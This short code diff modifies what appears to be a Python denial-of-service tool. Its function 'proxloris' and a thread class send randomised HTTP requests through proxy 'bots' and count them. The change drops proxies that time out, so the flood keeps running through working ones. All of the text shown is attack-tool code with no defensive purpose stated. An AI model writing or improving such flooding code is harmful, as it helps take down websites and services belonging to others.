@@ -1303,6 +1303,7 @@ def proxloris(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
 class phu(threading.Thread):
  def run(self):
   global counter
+  global httplist
   while (stop!=True):
    u=random.choice(paths)
    try:
@@ -1325,6 +1326,8 @@ class phu(threading.Thread):
     counter+=1
     if prints==True:
      print"[!]Requests: {} | Bot: {}".format(counter,pr.split(':')[0])
+   except socket.timeout:
+    httplist.remove(pr)
    except Exception as e:
     pass
 class hu(threading.Thread):
